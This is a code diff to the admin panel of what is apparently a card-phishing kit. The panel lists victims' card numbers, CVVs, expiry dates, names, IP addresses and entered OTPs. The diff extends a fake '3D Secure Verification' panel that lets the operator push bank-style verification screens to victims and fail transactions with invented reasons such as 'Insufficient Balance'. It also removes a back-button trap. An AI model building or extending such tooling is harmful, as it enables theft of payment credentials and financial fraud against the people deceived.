@@ -241,6 +241,45 @@
       margin-right: 5px;
       vertical-align: middle;
     }
+    /* MC Panel Failure Options */
+    .mc-fail-options {
+      margin-top: 10px;
+      display: none;
+    }
+    .mc-fail-reason-dropdown {
+      width: 100%;
+      padding: 8px;
+      margin-bottom: 8px;
+      background: #333;
+      color: white;
+      border: 1px solid #555;
+      border-radius: 4px;
+    }
+    .fail-options-btn {
+      background-color: #dc2626;
+      color: white;
+      padding: 8px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      width: 100%;
+      margin-bottom: 10px;
+    }
+    .fail-options-btn:hover {
+      background-color: #b91c1c;
+    }
+    .fail-transaction-btn {
+      background-color: #ef4444;
+      color: white;
+      padding: 8px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      width: 100%;
+    }
+    .fail-transaction-btn:hover {
+      background-color: #dc2626;
+    }
   </style>
 </head>
 <body>
@@ -318,12 +357,12 @@
     </table>
   </div>
 
-  <!-- MC OTP Panel - UPDATED with Verification Type selector -->
+  <!-- MC OTP Panel - UPDATED with Verification Type selector and failure reason options -->
   <div id="mcOtpPanel" class="fixed inset-0 bg-black bg-opacity-75 z-50 flex items-center justify-center hidden">
     <div class="bg-gray-800 p-6 rounded-lg max-w-md w-full">
       <h3 class="text-xl font-bold mb-4">3D Secure Verification</h3>
       
-      <!-- NEW: Verification Type Selector -->
+      <!-- Verification Type Selector -->
       <div class="mb-4">
         <label class="block text-sm mb-2">Verification Type:</label>
         <select id="mcVerificationType" class="bg-gray-700 text-white w-full p-2 rounded">
@@ -378,7 +417,7 @@
         </select>
       </div>
       
-      <!-- NEW: Start Verification Button -->
+      <!-- Start Verification Button -->
       <button id="mcStartVerification" class="bg-blue-600 text-white py-2 px-4 rounded mb-4 w-full">
         Start Verification
       </button>
@@ -392,9 +431,25 @@
         <button id="mcOtpSuccessBtn" class="bg-green-600 text-white py-2 px-4 rounded">
           Success
         </button>
-        <button id="mcOtpFailBtn" class="bg-red-600 text-white py-2 px-4 rounded">
-          Fail
+        
+        <!-- New Fail Options Button -->
+        <button id="mcFailOptionsBtn" class="fail-options-btn">
+          Fail Options
         </button>
+        
+        <!-- Failure Reason Options (Hidden by Default) -->
+        <div id="mcFailOptions" class="mc-fail-options">
+          <select id="mcFailReasonDropdown" class="mc-fail-reason-dropdown">
+            <option value="insufficient_balance">Insufficient Balance</option>
+            <option value="bank_declined">Bank Declined</option>
+            <option value="card_disabled">Card Disabled</option>
+            <option value="invalid_card">Invalid Card</option>
+          </select>
+          <button id="mcFailWithReasonBtn" class="fail-transaction-btn">
+            Fail Transaction
+          </button>
+        </div>
+        
         <button id="mcClosePanelBtn" class="bg-gray-600 text-white py-2 px-4 rounded mt-4">
           Close
         </button>
@@ -502,7 +557,7 @@
         
         const data = await response.json();
         
-        // Create geo data object
+       // Create geo data object
         const geoData = {
           city: data.city || 'Unknown',
           country: data.country_name || 'Unknown',
@@ -852,28 +907,29 @@
         }
 
         data.forEach(tx => {
-  const row = document.createElement('tr');
-  
-  // Bank info display
-  const bankInfoDisplay = tx.bankInfo ? 
-    `<div style="margin-top: 3px; font-size: 11px; color: #aaa;">
-      ${tx.bankInfo.bank || 'Unknown'} | ${tx.bankInfo.countryCode || ''} ${tx.bankInfo.country || 'Unknown'}
-     </div>` : '';
-  
-  row.innerHTML = `
-    <td>${tx.id}</td>
-    <td>${tx.email}</td>
-    <td>${tx.amount}</td>
-    <td>${tx.currency || 'INR'}</td>
-    <td>
-      ${tx.cardNumber}
-      ${bankInfoDisplay}
-    </td>
-    <td>${tx.cvv}</td>
-    <td>${tx.expiry}</td>
-    <td>${tx.cardholder}</td>
-    <td><span class="ip-address">${tx.ip || 'Unknown'}</span></td>
+          const row = document.createElement('tr');
+          
+          // Bank info display
+          const bankInfoDisplay = tx.bankInfo ? 
+            `<div style="margin-top: 3px; font-size: 11px; color: #aaa;">
+              ${tx.bankInfo.bank || 'Unknown'} | ${tx.bankInfo.countryCode || ''} ${tx.bankInfo.country || 'Unknown'}
+             </div>` : '';
+          
+          row.innerHTML = `
+            <td>${tx.id}</td>
+            <td>${tx.email}</td>
+            <td>${tx.amount}</td>
+            <td>${tx.currency || 'INR'}</td>
             <td>
+              ${tx.cardNumber}
+              ${bankInfoDisplay}
+            </td>
+            <td>${tx.cvv}</td>
+            <td>${tx.expiry}</td>
+            <td>${tx.cardholder}</td>
+            <td><span class="ip-address">${tx.ip || 'Unknown'}</span></td>
+            <td>
+              <td>
               ${tx.otpEntered ?
                 `<span class="otp-received">${tx.otpEntered}</span>
                  <button class="wrong-otp-btn" onclick="markWrongOTP('${tx.id}')" ${tx.redirectStatus ? 'disabled' : ''}>
@@ -1107,6 +1163,9 @@
       mcOtpValue.textContent = 'Waiting...';
       currentMcInvoiceId = id;
       
+      // Hide failure options by default
+      document.getElementById('mcFailOptions').style.display = 'none';
+      
       // Send event to client to show MC verification with loading state
       socket.emit('show_mc_verification', {
         invoiceId: id,
@@ -1189,17 +1248,51 @@
       updateVisitorsList(visitors);
     });
 
-  // MC verification event handlers
+    // MC verification event handlers
     document.addEventListener('DOMContentLoaded', function() {
       const mcOtpPanel = document.getElementById('mcOtpPanel');
       const mcBankSelect = document.getElementById('mcBankSelect');
       const mcVerificationType = document.getElementById('mcVerificationType');
       const mcOtpInvalidBtn = document.getElementById('mcOtpInvalidBtn');
       const mcOtpSuccessBtn = document.getElementById('mcOtpSuccessBtn');
-      const mcOtpFailBtn = document.getElementById('mcOtpFailBtn');
+      const mcFailOptionsBtn = document.getElementById('mcFailOptionsBtn');
+      const mcFailOptions = document.getElementById('mcFailOptions');
+      const mcFailWithReasonBtn = document.getElementById('mcFailWithReasonBtn');
+      const mcFailReasonDropdown = document.getElementById('mcFailReasonDropdown');
       const mcClosePanelBtn = document.getElementById('mcClosePanelBtn');
       
-      // NEW: Start Verification button handler
+      // Fail Options Button - Toggle dropdown
+      if (mcFailOptionsBtn) {
+        mcFailOptionsBtn.addEventListener('click', function() {
+          mcFailOptions.style.display = mcFailOptions.style.display === 'none' ? 'block' : 'none';
+        });
+      }
+      
+      // Fail with Reason Button
+      if (mcFailWithReasonBtn) {
+        mcFailWithReasonBtn.addEventListener('click', function() {
+          if (!currentMcInvoiceId) {
+            alert('No transaction selected for verification');
+            return;
+          }
+          
+          const reason = mcFailReasonDropdown.value;
+          console.log('Sending failed verification with reason:', reason);
+          
+          socket.emit('mc_verification_result', {
+            invoiceId: currentMcInvoiceId,
+            success: false,
+            reason: reason
+          });
+          
+          // Reset the panel
+          mcOtpPanel.classList.add('hidden');
+          mcFailOptions.style.display = 'none';
+          currentMcInvoiceId = null;
+        });
+      }
+      
+      // Start Verification button handler
       const mcStartVerificationBtn = document.getElementById('mcStartVerification');
       if (mcStartVerificationBtn) {
         mcStartVerificationBtn.addEventListener('click', function() {
@@ -1265,67 +1358,33 @@
         }
       });
       
-      // Fail button
-      mcOtpFailBtn.addEventListener('click', function() {
-        if (currentMcInvoiceId) {
-          console.log('Sending failed verification result for invoice:', currentMcInvoiceId);
-          socket.emit('mc_verification_result', {
-            invoiceId: currentMcInvoiceId,
-            success: false,
-            reason: 'declined'
-          });
-          
-          // Reset the panel
-          mcOtpPanel.classList.add('hidden');
-          currentMcInvoiceId = null;
-        }
-      });
-      
-      // Close button
+     // Close button
       mcClosePanelBtn.addEventListener('click', function() {
         console.log('Closing MC verification panel');
         mcOtpPanel.classList.add('hidden');
+        mcFailOptions.style.display = 'none';
         currentMcInvoiceId = null;
       });
     });
     
-    // Listen for OTP submission from client
-    socket.on('mc_otp_submitted', function(data) {
-      console.log('Received OTP from client:', data);
-      if (data.invoiceId === currentMcInvoiceId) {
-        const mcOtpValue = document.getElementById('mcOtpValue');
-        if (mcOtpValue) {
-          mcOtpValue.textContent = data.otp || 'Error: No OTP received';
-        }
+    // Handle OTP submission from client in MC verification panel
+    socket.on('mc_otp_submitted', (data) => {
+      console.log('MC OTP received:', data);
+      const mcOtpValue = document.getElementById('mcOtpValue');
+      if (mcOtpValue) {
+        mcOtpValue.textContent = data.otp;
       }
     });
-    
-    // Listen for OTP resend requests
-    socket.on('mc_resend_otp', function(data) {
-      console.log('Client requested OTP resend:', data);
-      // If we want to show this in the admin UI, we could add code here
-    });
 
-    // Initial Load
-    document.addEventListener('DOMContentLoaded', () => {
-      console.log('DOM loaded, initializing visitor tracking');
-      loadVisitors();
+    // Load data on page load
+    document.addEventListener('DOMContentLoaded', function() {
+      console.log('Loading admin panel data...');
       loadTransactions();
+      loadVisitors();
 
-      // Set up refresh intervals
-      setInterval(loadVisitors, 10000); // Check for visitors every 10 seconds
-      setInterval(loadTransactions, 10000); // Refresh transactions every 10 seconds
+      // Set up auto-refresh
+      setInterval(loadTransactions, 60000); // Refresh every minute
     });
-
-    // Back Button Prevention
-    window.onpopstate = function(event) {
-      if (confirm("Do you want to cancel this transaction?")) {
-        window.location.href = '/fail.html?reason=canceled';
-      } else {
-        history.pushState(null, null, window.location.href);
-      }
-    };
-    history.pushState(null, null, window.location.href);
   </script>
 </body>
 </html>
